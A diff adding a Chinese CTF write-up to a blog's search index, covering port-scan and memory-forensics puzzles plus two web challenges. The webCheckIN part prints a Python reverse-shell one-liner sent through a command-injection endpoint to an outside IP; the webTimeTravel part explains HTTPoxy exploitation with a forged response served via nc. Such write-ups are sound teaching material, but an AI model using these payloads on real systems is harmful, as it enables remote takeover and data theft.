@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>V&amp;N内部赛部分wp</title>
+    <url>/2020/03/06/v&amp;n%E5%86%85%E9%83%A8%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="misc拉胯的三条命令"><a href="#misc拉胯的三条命令" class="headerlink" title="misc拉胯的三条命令"></a>misc拉胯的三条命令</h1><p>打开后有个说明txt,说扫描端口查看开的端口,那直接看tcp握手有没有成功就可以了.</p>
+<p> 直接看ack和syn包有没有同时存在,最后有21,22, 631,801,3306开放,按顺序提交就可以了.</p>
+<p>(kali的wireshark有着色规则,一片红里面找白就可以了)</p>
+<h1 id="misc内存取证"><a href="#misc内存取证" class="headerlink" title="misc内存取证"></a>misc内存取证</h1><p>打开后直接上volatility,先看进程有ie,有mspaint,有truecrypt.</p>
+<p>先看iehistory,可以找到有个网盘地址:<a href="https://pan.baidu.com/share/init?surl=jAVwrRzIgW1QsLHidtzY_w" target="_blank" rel="noopener">https://pan.baidu.com/share/init?surl=jAVwrRzIgW1QsLHidtzY_w</a>.</p>
+<p>mspaint复原之后是一串字符串:lYxfCQ6goYBD6Q (这个字符串 到底是 1，l，I也不知道… 69o? 6g0? 6go?)</p>
+<p>把notepad进程dump下来过滤字符串txt可以看到有网盘提取码:heem.</p>
+<p>把百度网盘下载的VOL利用TrueCrypt进程的内存dump用Elcomsoft Forensic Disk Decryptor工具(吾爱有破解版)解密VOL再挂载得到key.key:uOjFdKu1jsbWI8N51jsbWI8N5.</p>
+<p>尝试了异或,维吉尼亚等有密钥的加解密.</p>
+<p>后来才知道要用key再解一次密,得到一个压缩包,然后掩码攻击得到flag.</p>
+<h1 id="webCheckIN"><a href="#webCheckIN" class="headerlink" title="webCheckIN"></a>webCheckIN</h1><p>打开靶机，发现是如下一个页面，直接给了源码。右键查看源码可以看到有换行的，方便查看。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">flag_file = open(&quot;flag.txt&quot;, &quot;r&quot;)</span><br><span class="line"># flag = flag_file.read()</span><br><span class="line"># flag_file.close()</span><br><span class="line">#</span><br><span class="line"># @app.route(&apos;/flag&apos;)</span><br><span class="line"># def flag():</span><br><span class="line">#     return flag</span><br><span class="line">## want flag? naive!</span><br><span class="line"># You will never find the thing you want:) I think</span><br><span class="line">@app.route(&apos;/shell&apos;)</span><br><span class="line">def shell():</span><br><span class="line">    os.system(&quot;rm -f flag.txt&quot;)</span><br><span class="line">    exec_cmd = request.args.get(&apos;c&apos;)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    return &quot;1&quot;</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def source():</span><br><span class="line">    return open(&quot;app.py&quot;,&quot;r&quot;).read()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>然后看看源码，可以看到是个 flask 应用。<br>前面打开了一个 flag 文件，后面被注释的部分是读这个文件的内容，下面有个被注释的路由是把 flag 显示出来。</p>
+<p>然后下面有个不带回显的 shell，在每次执行命令前都会把 flag 文件删除。</p>
+<p>那么就首先反弹个 shell 到自己的机器上吧。这里因为是 python 应用就直接用 python 反弹了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell?c=python3 -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.226.228&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>反弹之后可以看见 flag 文件是被删除了，但由于之前程序打开了 flag 文件，在 linux 系统中如果一个程序打开了一个文件没有关闭，即便从外部（上文是利用 rm -f flag.txt）删除之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的 fd，通过这个我们即可得到被删除文件的内容。<br>在 /proc/10/fd/3 下找到了 flag。</p>
+<h1 id="webTimeTravel"><a href="#webTimeTravel" class="headerlink" title="webTimeTravel"></a>webTimeTravel</h1><p>HTTPoxy漏洞（CVE-2016-5385）</p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">取自vulhub的一个cve</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">require __DIR__ . &apos;/vendor/autoload.php&apos;;</span><br><span class="line">use GuzzleHttp\Client;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&apos;flag&apos;])) &#123;</span><br><span class="line">    $client = new Client();</span><br><span class="line">    $response = $client-&gt;get(&apos;http://127.0.0.1:5000/api/eligible&apos;);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, TRUE);</span><br><span class="line">    if($data[&apos;success&apos;] === true) &#123;</span><br><span class="line">      echo system(&apos;/readflag&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">    highlight_file($_GET[&apos;file&apos;]);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;phpinfo&apos;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞的前提之一就是:你的服务跑在PHP的CGI模式下(cgi, php-fpm),看一下phpinfo找到fpm<br>然后就看一下如何利用吧:</p>
+<ul>
+<li>cgi（fastcgi）要将用户传入的所有HTTP头都加上HTTP_前缀放入环境变量中，而恰好大多数类库约&gt;定俗成会提取环境变量中的HTTP_PROXY值作为HTTP代理地址。于是，恶意用户通过提交Proxy: &gt;<a href="http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为[http://evil.com](http://evil.com)，进而窃取数据包&gt;中可能存在的敏感信息。" target="_blank" rel="noopener">http://evil.com这样的HTTP头，将使用缺陷类库的网站的代理设置为[http://evil.com](http://evil.com)，进而窃取数据包&gt;中可能存在的敏感信息。</a></li>
+<li>PHP5.6.24版本修复了该漏洞，不会再将Proxy放入环境变量中.</li>
+</ul>
+<p>也就是增加一个Proxy的头，cgi会自动将我们加上HTTP_前缀，正好构成了环境变量中的HTTP_PROXY代理，结合题目就是将请求结果构造成{“success”=&gt;true}会返回flag.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还是要用到内网服务器，不过这里达服务我一直没弄成功，其实只要构造一个response返回就可以了，参考一位师傅的payload：</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在请求包内添加:Proxy: 172.0.219.177:9999<br>然后在服务器172.0.219.177上执行:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 &lt; 1.txt</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>misc&amp;web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>mysql盲注常用函数</title>
     <url>/2020/03/02/mysql%E7%9B%B2%E6%B3%A8%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[<h1 id="mysql盲注常用函数"><a href="#mysql盲注常用函数" class="headerlink" title="mysql盲注常用函数"></a>mysql盲注常用函数</h1><a id="more"></a>
